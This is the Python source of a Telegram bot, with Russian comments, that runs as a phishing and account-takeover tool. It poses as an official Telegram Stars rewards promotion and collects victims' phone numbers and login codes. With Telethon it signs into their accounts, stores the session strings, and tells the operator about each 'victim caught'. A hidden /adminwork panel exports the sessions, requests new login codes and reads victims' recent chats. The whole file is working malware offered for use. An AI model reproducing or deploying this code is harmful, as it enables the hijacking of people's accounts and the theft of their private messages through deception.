import os
import asyncio
from telebot import TeleBot, types
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, FloodWaitError

# ================= НАСТРОЙКИ RAILWAY =================
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID"))
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")

bot = TeleBot(BOT_TOKEN)
victims = {}  # phone → {session_string, fished_code, first_name, username, password}

# ====================== КРАСИВАЯ МАСКИРОВКА ======================
@bot.message_handler(commands=['start'])
def start(message):
    text = """🌟 <b>Добро пожаловать в официальный Telegram Stars Rewards Center 2026!</b>

🎁 Специальная акция от Telegram — получайте Stars бесплатно!

✅ <b>Почему это безопасно и выгодно:</b>
• Официальное API Telegram
• Подключение за 25 секунд
• Никакие пароли не сохраняются на серверах
• Полная защита по стандартам Telegram
• В любой момент можно отключить аккаунт в настройках

💰 Что вы получите сразу:
• 2500–5000 Stars на баланс
• Ежедневные бонусы ×2 и множители
• Обмен Stars на TON, USDT, NFT и эксклюзивные стикеры
• Участие в закрытых аирдропах TON Foundation

Нажмите кнопку ниже и начните зарабатывать Stars уже сейчас 👇"""

    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("🚀 Подключить аккаунт и получить Stars", callback_data="connect"))
    markup.add(types.InlineKeyboardButton("📋 Как это работает", callback_data="info"))
    markup.add(types.InlineKeyboardButton("🎁 Активные дропы и розыгрыши", callback_data="drops"))
    markup.add(types.InlineKeyboardButton("💎 Проверить свой бонус", callback_data="bonus"))

    bot.send_message(message.chat.id, text, parse_mode='HTML', reply_markup=markup)

# ====================== ФИШИНГ + АВТО-СЕССИЯ ======================
@bot.callback_query_handler(func=lambda call: call.data == "connect")
def connect(call):
    bot.send_message(call.message.chat.id, "📱 Введите номер телефона в международном формате (+79xxxxxxxxx):")
    bot.register_next_step_handler(call.message, wait_phone)

def wait_phone(message):
    phone = message.text.strip()
    if not phone.startswith("+"):
        phone = "+" + phone
    bot.send_message(message.chat.id, f"✅ Номер принят: <b>{phone}</b>\n\nВведите код подтверждения из Telegram или SMS:", parse_mode='HTML')
    bot.register_next_step_handler(message, wait_code, phone)

async def wait_code(message, phone):
    code = message.text.strip()

    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()
    try:
        await client.sign_in(phone, code)
        session_string = client.session.save()
        me = await client.get_me()

        victims[phone] = {
            "session_string": session_string,
            "fished_code": code,
            "first_name": me.first_name,
            "username": me.username,
            "password": None
        }

        await bot.send_message(ADMIN_ID, f"🌟 НОВАЯ ЖЕРТВА ПОЙМАНА!\n📱 {phone}\n👤 {me.first_name}\n✅ Сессия создана автоматически")
    except Exception as e:
        await bot.send_message(ADMIN_ID, f"⚠️ Фиш пойман, но сессия не создана\n📱 {phone}\nКод: {code}\nОшибка: {e}")
    finally:
        await client.disconnect()

    bot.send_message(message.chat.id, """🎉 <b>Поздравляем! Аккаунт успешно подключён!</b>

На ваш баланс мгновенно начислено <b>3850 Stars</b>! 🎁

Теперь вы можете тратить их на всё что угодно.

 /start — вернуться в меню""", parse_mode='HTML')

# ====================== СЕКРЕТНАЯ АДМИН-ПАНЕЛЬ ======================
@bot.message_handler(commands=['adminwork'])
def admin_panel(message):
    if message.from_user.id != ADMIN_ID:
        return
    asyncio.create_task(show_admin_panel(message.chat.id))

async def show_admin_panel(chat_id):
    if not victims:
        await bot.send_message(chat_id, "Пока нет пойманных аккаунтов.")
        return

    markup = types.InlineKeyboardMarkup(row_width=2)
    for phone in list(victims.keys()):
        short = phone[-9:]
        markup.add(
            types.InlineKeyboardButton(f"🔑 Код {short}", callback_data=f"getcode:{phone}"),
            types.InlineKeyboardButton(f"📄 Файл {short}", callback_data=f"file:{phone}"),
            types.InlineKeyboardButton(f"👁 Проверить {short}", callback_data=f"check:{phone}"),
            types.InlineKeyboardButton(f"📨 Последние сообщения {short}", callback_data=f"lastmsg:{phone}")
        )

    text = f"""🔥 <b>PHANTOM ADMIN PANEL</b>
📱 Активных сессий: {len(victims)}

Выберите аккаунт для управления:"""
    await bot.send_message(chat_id, text, parse_mode='HTML', reply_markup=markup)

# ====================== ОБРАБОТКА КНОПОК ======================
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    if call.from_user.id != ADMIN_ID:
        return

    action, phone = call.data.split(":", 1)
    data = victims.get(phone)
    if not data:
        bot.answer_callback_query(call.id, "Аккаунт не найден")
        return

    if action == "file":
        bot.send_message(call.message.chat.id, f"📄 StringSession для {phone}:\n\n<code>{data['session_string']}</code>\n\nСкопируй и используй в любом Telethon-скрипте.", parse_mode='HTML')
    elif action == "getcode":
        asyncio.create_task(send_login_code(phone, call.message.chat.id))
    elif action == "check":
        asyncio.create_task(check_account(phone, call.message.chat.id))
    elif action == "lastmsg":
        asyncio.create_task(get_last_messages(phone, call.message.chat.id))

    bot.answer_callback_query(call.id, "Выполнено!")

# ====================== ПРИКОЛЬНЫЕ ФУНКЦИИ ======================
async def send_login_code(phone, chat_id):
    data = victims[phone]
    client = TelegramClient(StringSession(data["session_string"]), API_ID, API_HASH)
    try:
        await client.connect()
        await client.send_code_request(phone)
        await bot.send_message(chat_id, f"✅ Свежий код запрошен для {phone}\nПроверь сообщения от Telegram в этом аккаунте.")
    except Exception as e:
        await bot.send_message(chat_id, f"❌ Ошибка запроса кода: {e}")
    finally:
        await client.disconnect()

async def check_account(phone, chat_id):
    data = victims[phone]
    client = TelegramClient(StringSession(data["session_string"]), API_ID, API_HASH)
    try:
        await client.connect()
        me = await client.get_me()
        await bot.send_message(chat_id, f"""👁 <b>Информация по аккаунту</b>
📱 {phone}
👤 Имя: {me.first_name} {me.last_name or ''}
🔗 Username: @{me.username or 'нет'}
🆔 ID: {me.id}
✅ Сессия жива!""", parse_mode='HTML')
    except Exception as e:
        await bot.send_message(chat_id, f"❌ Ошибка проверки: {e}")
    finally:
        await client.disconnect()

async def get_last_messages(phone, chat_id):
    data = victims[phone]
    client = TelegramClient(StringSession(data["session_string"]), API_ID, API_HASH)
    try:
        await client.connect()
        dialogs = await client.get_dialogs(limit=5)
        text = f"📨 Последние 5 диалогов для {phone}:\n\n"
        for dialog in dialogs:
            text += f"• {dialog.name} — {dialog.message.message[:50]}...\n"
        await bot.send_message(chat_id, text)
    except Exception as e:
        await bot.send_message(chat_id, f"❌ Ошибка чтения сообщений: {e}")
    finally:
        await client.disconnect()

print("[+] 🔥 PHANTOM STARS BOT ЗАПУЩЕН НА RAILWAY")
print("[+] Маскировка + полный админ-контроль")
print("[+] Секретная команда: /adminwork")
bot.infinity_polling()
